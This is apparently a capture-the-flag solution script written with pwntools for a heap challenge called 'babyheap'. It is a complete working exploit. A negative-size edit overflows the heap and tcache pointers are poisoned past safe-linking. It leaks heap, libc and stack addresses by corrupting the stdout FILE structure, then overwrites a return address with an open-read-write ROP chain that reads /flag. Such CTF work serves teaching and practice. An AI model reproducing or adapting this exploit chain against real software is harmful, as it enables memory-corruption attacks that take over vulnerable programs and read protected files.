#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '47.100.33.132', 2204
binary = './babyheap'
brkpts = '''
b*$rebase(0x1d55)
c
'''

elf = ELF("babyheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def menu():
    return reu(MENU[-2:])

MENU = b'\n1. Allocate\n2. Update\n3. Delete\n4. View\n5. Exit\nCommand: '

def alloc(size, content):
    menu()
    s(b'1\n')
    reu(b'Size: ')
    sl(str(size))
    reu(b'Content: ')
    if len(content) == size:
        s(content)
    else:
        sl(content)

def edit(idx, size, content):
    menu()
    s(b'2\n')
    reu(b'Index: ')
    sl(str(idx))
    reu(b'Size: ')
    sl(str(size))
    reu(b'Content: ')
    if len(content) == size:
        s(content)
    else:
        sl(content)


def free(idx):
    menu()
    s(b'3\n')
    reu(b'Index: ')
    sl(str(idx))


def view(idx):
    menu()
    s(b'4\n')
    reu(b'Index: ')
    sl(str(idx))

def encode(ptr):
    return ptr ^ (heap >> 12)

if __name__ == "__main__":
    alloc(0x18, "a") # 0
    alloc(0x18, "a") # 1
    alloc(0x18, "a") # 2
    alloc(0x28, "a") # 3
    alloc(0x38, "a") # 4
    alloc(0x48, "a") # 5
    alloc(0x420, "b") # 6
    alloc(0x18, "a") # 7
    alloc(0x28, "a") # 8
    alloc(0x38, "a") # 9
    alloc(0x48, "a") # 10


    edit(0, -1, p64(0)*3 + p64(0x411))
    free(1)

    payload = flat([
        0, 0, 0,
        0x21,
        0, 0, 0,
        0x31,
        0, 0, 0, 0, 0,
        0x41,
        0, 0, 0, 0, 0, 0, 0,
        0x51,
        0, 0, 0, 0, 0, 0, 0, 0, 0,
        0x431
    ])
    alloc(0x408, payload)

    # To unsorted
    free(6)

    # Tcache (0x20)
    free(2)
    free(7)

    # Tcache (0x30)
    free(8)
    free(3)

    # Tcache (0x40)
    free(9)
    free(4)

    # Tcache (0x50)
    free(10)
    free(5)

    # Leak libc and heap
    view(1)
    reu(b"Chunk[1]: ")

    re(0x20)
    heap = u64(re(8)) << 12
    log.info("heap @ "+hex(heap))

    re(0xd8)
    libc.address = u64(re(8)) - 0x219ce0
    log.info("libc @ "+hex(libc.address))

    environ = libc.symbols['environ']
    stdout = libc.symbols["_IO_2_1_stdout_"]

    target = encode(stdout - 0x20)
    payload = flat([
        0, 0, 0,
        0x21,
        0, 0, 0,
        0x31,
        target
    ])
    edit(1, len(payload), payload)
    sl('1')

    # 2
    alloc(0x28, "a")

    # 3
    alloc(0x28, "a")

    payload = flat([
        0, 0, 0, 0,
        0xfbad1800, 0, 0, 0,
        environ, environ+8, environ+8, environ+8,
        environ+9
    ])
    edit(3, -1, payload)

    stack = u64(re(8))
    log.info("stack @ "+hex(stack))
    retaddr = stack - 0x128

    target = encode(retaddr)
    payload = flat([
        0, 0, 0,
        0x21,
        b"/flag\x00\x00\x00", 0, 0,
        0x31,
        0, 0, 0, 0, 0,
        0x41,
        target
    ])
    edit(1, len(payload), payload)
    sl('1')

    # 4
    alloc(0x38, "a")
    # 5
    alloc(0x38, "a")

    # Replace with ORW ropchain
    pop_rdi = libc.address + 0x2a3e5
    pop_rax = libc.address + 0x1284f0
    pop_rsi = libc.address + 0x1bb317
    pop_rdx_r12 = libc.address + 0x11f497
    syscall = libc.address + 0x91396
    ret = pop_rdi + 1

    ropchain = flat([
        # Open
        0xdeadbeef,
        pop_rdi, heap + 0x2e0,
        pop_rsi, 0,
        pop_rdx_r12, 0, 0,
        pop_rax, 2,
        syscall,
        # Read
        pop_rdi, 3,
        pop_rsi, heap + 0x2e0,
        pop_rdx_r12, 0x50, 0,
        pop_rax, 0,
        syscall,
        # Write
        pop_rdi, 1,
        pop_rax, 1,
        syscall
    ])

    edit(5, -1, ropchain)

    sl('5')

    io.interactive()
